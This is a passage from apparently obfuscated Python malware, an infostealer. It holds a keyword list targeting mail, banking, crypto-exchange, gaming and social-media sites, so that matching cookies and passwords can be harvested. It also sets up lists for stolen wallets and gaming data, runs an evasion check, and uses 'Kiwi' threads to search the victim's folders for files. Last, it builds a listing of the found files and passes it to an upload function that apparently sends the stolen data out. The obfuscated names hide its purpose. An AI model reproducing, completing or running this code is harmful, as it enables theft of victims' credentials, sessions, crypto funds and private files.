        OOOOOO00OOOO0OO00 .append (OOOOO0O0O0O00OOO0 )#line:998
    return OOOOOO00OOOO0OO00 #line:999
global keyword ,cookiWords ,paswWords ,CookiCount ,P4sswCount ,WalletsZip ,GamingZip ,OtherZip #line:1002
keyword =['mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)']#line:1006
CookiCount ,P4sswCount =0 ,0 #line:1008
cookiWords =[]#line:1009
paswWords =[]#line:1010
WalletsZip =[]#line:1012
GamingZip =[]#line:1013
OtherZip =[]#line:1014
GatherAll ()#line:1016
DETECTED =TR6st (C00k13 )#line:1017
if not DETECTED :#line:1019
    wikith =Kiwi ()#line:1020
    for thread in wikith :thread .join ()#line:1022
    time .sleep (0.2 )#line:1023
    filetext ="\n"#line:1025
    for arg in KiwiFiles :#line:1026
        if len (arg [2 ])!=0 :#line:1027
            foldpath =arg [1 ]#line:1028
            foldlist =arg [2 ]#line:1029
            filetext +=f"📁 {foldpath}\n"#line:1030
            for ffil in foldlist :#line:1032
                a =ffil [0 ].split ("/")#line:1033
                fileanme =a [len (a )-1 ]#line:1034
                b =ffil [1 ]#line:1035
                filetext +=f"└─:open_file_folder: [{fileanme}]({b})\n"#line:1036
            filetext +="\n"#line:1037
    upload ("kiwi",filetext )
